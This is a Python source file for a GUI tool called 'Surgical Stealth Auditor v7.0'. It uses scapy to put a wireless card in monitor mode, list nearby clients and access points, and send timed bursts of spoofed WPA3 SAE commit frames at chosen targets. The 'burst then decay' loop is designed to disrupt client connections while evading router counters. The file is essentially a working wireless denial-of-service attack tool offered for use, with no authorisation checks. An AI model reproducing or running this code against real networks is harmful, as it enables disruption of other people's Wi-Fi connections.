import os, sys, time, threading
from scapy.all import *
import tkinter as tk
from tkinter import ttk

class StealthAuditor:
    def __init__(self, iface):
        self.iface = iface
        self.discovered = {}
        self.running = True
        self.firing = False
        
        self.lock_hardware()
        self.build_gui()

    def lock_hardware(self):
        # Stop 'the fucker' (NetworkManager) from flipping the card
        os.system("sudo airmon-ng check kill > /dev/null 2>&1")
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type monitor && sudo ip link set {self.iface} up")

    def build_gui(self):
        self.root = tk.Tk()
        self.root.title("Surgical Stealth Auditor v7.0")
        self.root.geometry("1000x800")
        self.root.configure(bg="#050505")

        # Search
        search_frame = tk.Frame(self.root, bg="#050505")
        search_frame.pack(pady=10, fill="x", padx=20)
        self.search_var = tk.StringVar()
        self.search_var.trace("w", lambda *args: self.update_ui())
        tk.Entry(search_frame, textvariable=self.search_var, bg="#111", fg="#00FF41").pack(side="left", fill="x", expand=True)

        # Treeview
        self.tree = ttk.Treeview(self.root, columns=("MAC", "SSID", "BSSID", "CH"), show="headings")
        for col in ("MAC", "SSID", "BSSID", "CH"): self.tree.heading(col, text=col)
        self.tree.pack(padx=20, pady=10, fill="both", expand=True)

        # Duty Cycle Controls
        self.btn_text = tk.StringVar(value="ENGAGE STEALTH PULSE")
        tk.Button(self.root, textvariable=self.btn_text, command=self.toggle_attack, bg="#0044aa", fg="white", height=2).pack(pady=10)
        
        # Status
        self.status_var = tk.StringVar(value="Status: Ready")
        tk.Label(self.root, textvariable=self.status_var, fg="#888", bg="#050505").pack()

        threading.Thread(target=self.hopper, daemon=True).start()
        threading.Thread(target=self.scanner, daemon=True).start()

    def toggle_attack(self):
        if not self.firing:
            sel = self.tree.selection()
            if not sel: return
            self.firing = True
            self.btn_text.set("PULSE ACTIVE (STEALTH)")
            targets = [self.tree.item(i)["values"] for i in sel]
            threading.Thread(target=self.duty_cycle_loop, args=(targets,), daemon=True).start()
        else:
            self.firing = False
            self.btn_text.set("ENGAGE STEALTH PULSE")

    def duty_cycle_loop(self, targets):
        """
        The Stealth Logic: Burst then Decay.
        """
        while self.firing:
            for mac, ssid, bssid, ch in targets:
                if not self.firing: break
                
                self.status_var.set(f"Bursting: {mac}")
                os.system(f"sudo iw dev {self.iface} set channel {ch}")
                
                # SAE Commit - The "I am trying to connect" signal
                pkt = RadioTap()/Dot11(addr1=bssid, addr2=mac, addr3=bssid)/Dot11Auth(algo=3, seqnum=1)
                
                try:
                    # 1. THE BURST: 5 rapid packets to desync state
                    sendp(pkt, iface=self.iface, count=5, inter=0.01, verbose=False)
                    
                    # 2. THE DECAY: Wait for the router's counter to drop
                    self.status_var.set(f"Decay (Waiting): {mac}")
                    time.sleep(3) # 3-second 'cool down'
                    
                except:
                    self.firing = False
                    break
        self.status_var.set("Status: Ready")

    def scanner(self):
        def callback(pkt):
            if not self.firing and pkt.haslayer(Dot11):
                if pkt.type == 0 and pkt.subtype == 8:
                    ssid = pkt.info.decode(errors="ignore") or "Hidden"
                    bssid = pkt.addr3
                    for mac, data in self.discovered.items():
                        if data["BSSID"] == bssid: data["SSID"] = ssid
                if pkt.addr2 and pkt.addr3 and pkt.addr2 != pkt.addr3:
                    mac, bssid = pkt.addr2, pkt.addr3
                    if mac not in self.discovered and ":" in mac:
                        self.discovered[mac] = {"BSSID": bssid, "SSID": "Scanning...", "CH": self.current_ch}
                        self.root.after(0, self.update_ui)
        sniff(iface=self.iface, prn=callback, store=0)

    def update_ui(self):
        search_term = self.search_var.get().lower()
        for i in self.tree.get_children(): self.tree.delete(i)
        for mac, info in self.discovered.items():
            if search_term in mac.lower() or search_term in info["SSID"].lower():
                self.tree.insert("", "end", values=(mac, info["SSID"], info["BSSID"], info["CH"]))

    def hopper(self):
        ch = 1
        while self.running:
            if not self.firing:
                os.system(f"sudo iw dev {self.iface} set channel {ch}")
                self.current_ch = ch
                ch = (ch % 13) + 1
                time.sleep(0.5)
            else: time.sleep(1)

    def shutdown(self):
        self.running = False; self.firing = False
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type managed && sudo ip link set {self.iface} up && sudo systemctl restart NetworkManager")
        self.root.destroy()

if __name__ == "__main__":
    StealthAuditor(sys.argv[1]).root.mainloop()
